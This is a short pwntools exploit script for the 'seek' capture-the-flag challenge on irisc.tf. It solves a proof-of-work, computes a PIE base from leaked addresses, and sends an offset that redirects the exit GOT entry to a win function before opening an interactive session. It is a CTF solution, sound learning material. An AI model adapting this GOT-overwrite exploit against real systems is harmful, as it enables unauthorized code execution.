import subprocess

from pwn import *

context.log_level = 'DEBUG'

#p = process('../file/chal')
p = remote('seek.chal.irisc.tf', '10004')

# Remote部分才需要
p.recvuntil(b'pow) ')
args = ['python3', 'kctf-pow.py'] + p.recvuntil(b'\n').decode().split()
r = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
p.send(r.stdout + b'\n')

p.recvuntil(b'around ')
win = eval(p.recvuntil(b'.', drop=True).decode())
p.recvuntil(b'at ')
current = eval(p.recvuntil(b'.', drop=True).decode())

p.recvuntil(b'into?')

'''
000000003438  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000003440  000300000007 R_X86_64_JUMP_SLO 0000000000000000 system@GLIBC_2.2.5 + 0
000000003448  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000003450  000700000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
000000003458  000800000007 R_X86_64_JUMP_SLO 0000000000000000 fopen@GLIBC_2.2.5 + 0
000000003460  000900000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0
000000003468  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
000000003470  000b00000007 R_X86_64_JUMP_SLO 0000000000000000 fwrite@GLIBC_2.2.5 + 0
'''
base = win - 0x0000000000001229
target = base + 0x000000003468
offset = str(target - current)

p.send(offset.encode())

p.interactive()
